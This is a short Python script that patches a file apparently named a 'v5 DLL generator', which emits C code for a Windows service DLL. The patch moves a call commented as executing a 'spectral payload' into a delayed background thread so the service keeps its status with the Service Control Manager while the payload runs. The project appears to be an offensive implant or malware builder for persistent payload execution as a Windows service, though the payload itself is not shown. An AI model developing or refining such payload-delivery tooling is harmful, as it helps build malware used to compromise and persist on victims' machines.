with open('core/v5_dll_generator.py') as f:
    c = f.read()

old = '    /* Execute spectral payload */\n    sg_execute();\n\n    g_status.dwCurrentState = SERVICE_STOPPED;\n    SetServiceStatus(g_handle, &g_status);\n}}'

new = '''    /* Report RUNNING to SCM before executing payload */
    /* Then run payload in background thread */
    HANDLE worker = CreateThread(NULL, 0,
        (LPTHREAD_START_ROUTINE)sg_execute_thread, NULL, 0, NULL);
    if(worker) {{
        WaitForSingleObject(worker, 15000);
        CloseHandle(worker);
    }}

    g_status.dwCurrentState = SERVICE_STOPPED;
    SetServiceStatus(g_handle, &g_status);
}}'''

# Add worker thread function before ServiceMain
worker_fn = '''
static DWORD WINAPI sg_execute_thread(LPVOID param) {{
    Sleep(300);
    sg_execute();
    return 0;
}}

'''

c = c.replace('/* Service control handler */', worker_fn + '/* Service control handler */')
c = c.replace(old, new)

with open('core/v5_dll_generator.py', 'w') as f:
    f.write(c)
print('Fixed')
